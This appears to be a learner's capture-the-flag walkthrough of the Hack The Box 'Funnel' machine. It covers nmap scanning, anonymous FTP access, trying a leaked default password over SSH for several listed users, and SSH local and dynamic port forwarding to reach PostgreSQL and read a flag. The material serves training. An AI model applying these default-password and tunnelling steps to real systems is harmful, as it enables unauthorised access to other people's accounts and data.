- [nmap](#nmap)
- [FTP](#ftp)
- [Deep dive retrieved files from enumeration](#deep-dive-retrieved-files-from-enumeration)
			- [PDF contents](#pdf-contents)
			- [Email Content](#email-content)
- [SSH Enumeration](#ssh-enumeration)
- [Deepdive in SSH user](#deepdive-in-ssh-user)
- [Enumerating nmap again](#enumerating-nmap-again)
- [postgresql enumeration and access](#postgresql-enumeration-and-access)
- [port forwarding](#port-forwarding)
- [(yet another) postgres sql enumeration](#yet-another-postgres-sql-enumeration)
- [Using dynamic port forwarding](#using-dynamic-port-forwarding)


# Funnel Enumeration

## nmap

I initially ran the following command: Looks like we have 2 ports open. 

```bash
$ nmap funnel.htb

Nmap scan report for funnel.htb (10.129.228.195)
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```


```bash
$ nmap -sC -sV -oA nmap/funnel 10.0.0.1
Nmap scan report for funnel.htb (10.129.228.195)
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```


Key Findings:
- ftp server on port 21
- ssh server on port 22

## FTP

The `nmap` gave me details on FTP anonymous login. 

```bash
$ ftp funnel.htb
Connected to funnel.htb.
220 (vsFTPd 3.0.3)
Name (funnel.htb:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
226 Directory send OK.
ftp> cd mail_backup
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
-rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
226 Directory send OK.
ftp> mget *
mget password_policy.pdf? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for password_policy.pdf (58899 bytes).
226 Transfer complete.
58899 bytes received in 0.48 secs (120.8505 kB/s)
mget welcome_28112022? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for welcome_28112022 (713 bytes).
226 Transfer complete.
713 bytes received in 0.00 secs (1006.1981 kB/s)

```

The FTP has a directory named `mail_backup` . Under the dir, I found two files which I would like to deepdive.

Using `mget *` , I bulk downloaded the files.

Key findings:
- FTP allowed anonymous login using `anonymous` username. Password is blank
- The FTP had a directory called `mail_backup` and it contained two files.

## Deep dive retrieved files from enumeration

##### PDF contents

![password_policy](password_policy.png)
The password policy pdf has the general guideline on creating a secure password. It also hints that the default password is `funnel123#!#` .

##### Email Content

```bash
$ cat welcome_28112022 
Frome: root@funnel.htb
To: optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb
Subject:Welcome to the team!

Hello everyone,
We would like to welcome you to our team. 
We think you’ll be a great asset to the "Funnel" team and want to make sure you get settled in as smoothly as possible.
We have set up your accounts that you will need to access our internal infrastracture. Please, read through the attached password policy with extreme care.
All the steps mentioned there should be completed as soon as possible. If you have any questions or concerns feel free to reach directly to your manager. 
We hope that you will have an amazing time with us,
The funnel team. 
```

The welcome email was a copy of email which seems to be an onboarding email to new employees. This is good because its exposing the `To:` section and we can try to see if anyone in the group has forgotten to change their account password. 

- optimus
- albert
- andreas
- christine

## SSH Enumeration

Assuming that one of them forgot to change their password, I'm trying to access each user's machine by using the default funnel123#!#  

```bash
$ ssh christine@funnel.htb
christine@funnel.htb\'s password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 12 Jun 2024 12:30:20 AM UTC

  System load:              0.0
  Usage of /:               61.4% of 4.78GB
  Memory usage:             12%
  Swap usage:               0%
  Processes:                159
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for ens160:  10.129.228.195
  IPv6 address for ens160:  dead:beef::250:56ff:feb0:e80a

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

christine@funnel:~$ 
```

| Name      | Success ? |
| --------- | --------- |
| optimus   | F         |
| albert    | F         |
| andreas   | F         |
| christine | T         |

Turns out it was `christine` who forgot to change her password.

## Deepdive in SSH user

Looking into `christine`'s machine, I could not find any `flag.txt` and no access to root directory. I tried `sudo -l` to see any commands I can run in `sudo` but turns out , it wasn't allowed

```bash
christine@funnel:/$ sudo -l
[sudo] password for christine: 
Sorry, user christine may not run sudo on funnel.
```

Since I have guided mode on , I checked the next question which gave me a big hint: **Which service is running on TCP port 5432** ...

## Enumerating nmap again
With the hint given by the guided mode, I once again ran the nmap for port 5432

```bash
$ nmap -p 5432 -sCV funnel.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-12 01:39 BST
Nmap scan report for funnel.htb (10.129.228.195)
Host is up (0.25s latency).

PORT     STATE  SERVICE    VERSION
5432/tcp closed postgresql
```

Seems like we have a running `postgresql`

## postgresql enumeration and access

Accessing postgresql requires `psql` command, which the default parrot OS has.

```bash
$ psql -h funnel.htb
psql: error: could not connect to server: Connection refused
	Is the server running on host "funnel.htb" (10.129.228.195) and accepting
	TCP/IP connections on port 5432?
```

Unfortunately, the postgresql seems to be refusing the connection.
Looking into ( accidentally...) the guided mode, they are suggesting to check what `local port forwarding` and `reomte port forwardin` are. These seem to hint that we have to make `tunnel` to  access the postgresql machine. 

The resource I referred is [This one](https://builtin.com/software-engineering-perspectives/ssh-port-forwarding#)and it gives you the definition of each tunneling as below.

```
There are three types of SSH port forwarding:

1. **Local port forwarding**: Redirects traffic from a local port on the client machine to a specified port on a remote server via an SSH connection.
2. **Remote port forwarding**: Redirects traffic from a port on the remote server to a specified port on the client machine.
3. **Dynamic port forwarding**: Creates a SOCKS proxy on the client machine, enabling the forwarding of traffic from various applications through the SSH connection.
```

For this case, we need to execute `Local Port Forwarding` as we are going to access the remote server ( target machine) 

## port forwarding

The [website](https://builtin.com/software-engineering-perspectives/ssh-port-forwarding#) actually has the command example of how to port foward

```bash
ssh -L [local_port]:[destination_address]:[destination_port] [username]@[ssh_server]
```

and then open  a new tab to call postgresql

```bash
psql -h localhost -U christine -p 1234
```

Reading this command, I initially thought the correct way to port forward was as below

```bash
ssh -L 1234:funnel.htb:5432 christine@funnel.htb
```

However, this was continuously giving me an error for failing name resolution.
Checking the [video](https://www.youtube.com/watch?v=_tRr1l4YUQ0&t=636s) Turns out the `destination_address` i have to specify here was my localhost, not my target host.

```bash
ssh -L 1234:localhost:5432 christine@funnel.htb
psql -h localhost -U christine -p 1234

Password for user christine: 
psql (16.2 (Debian 16.2-1), server 15.1 (Debian 15.1-1.pgdg110+1))
Type "help" for help.

christine=# 
```

## (yet another) postgres sql enumeration 

I found [this website wit postgres cheatsheet](https://www.postgresqltutorial.com/postgresql-cheat-sheet/)

```bash
christine=# \l  // Get list up databases
```

![postgres_l](postgres_l.png)

database called `secrets` stood out immediately. let me try to access the database

```bash
christine=# \c secrets //access to database called secrets
psql (16.2 (Debian 16.2-1), server 15.1 (Debian 15.1-1.pgdg110+1))
You are now connected to database "secrets" as user "christine".
secrets=# \d  // check schema
         List of relations
 Schema | Name | Type  |   Owner   
--------+------+-------+-----------
 public | flag | table | christine
(1 row)

secrets=# select * from flag;
              value               
----------------------------------
 cf277664b1771217d7006acdea006db1
```

Yes ! I got something that looks like a flag `cf2**********************`

## Using dynamic port forwarding

One of the last questions in the guided mode is about dynamic port forwarding. (Can we access the postgres sql serve using dynamic port forwarding ? ) . Turns out **yes**, but it's pretty tricky.

I referred to [this video](https://youtu.be/_tRr1l4YUQ0?t=959&si=B7FGsmYKKjH6BLSE) and tried the same thing (SSH -D and add socks5 in the conf file) but my port forwarding didn't work.

The video suggested to add `socks5 127.0.0.1 {port}` just below the default socks4, but I noticed when I try to access the `psql` , this `socks4` was somehow interfering my access

```bash
ssh -D localhost:1234 christine@funnel.htb  #Dynamic Port forwarding
```

```bash
cat /etc/proxychains4.conf #add proxy 
..... (omit some lines)
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 1337 
socks4 127.0.0.1 9050
```

```bash
 proxychains psql -U christine -h localhost -p 5432
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:9050 <--socket error or timeout!
psql: error: connection to server at "localhost" (127.0.0.1), port 5432 failed: Connection refused
        Is the server running on that host and accepting TCP/IP connections?
```

To solve the issue, I commented out `socks4 127.0.0.1 9050` and it worked 

```bash
$ proxychains psql -U christine -h localhost -p 5432
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:5432  ...  OK
Password for user christine: 
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:5432  ...  OK
psql (16.2 (Debian 16.2-1), server 15.1 (Debian 15.1-1.pgdg110+1))
Type "help" for help.

christine=# 
```

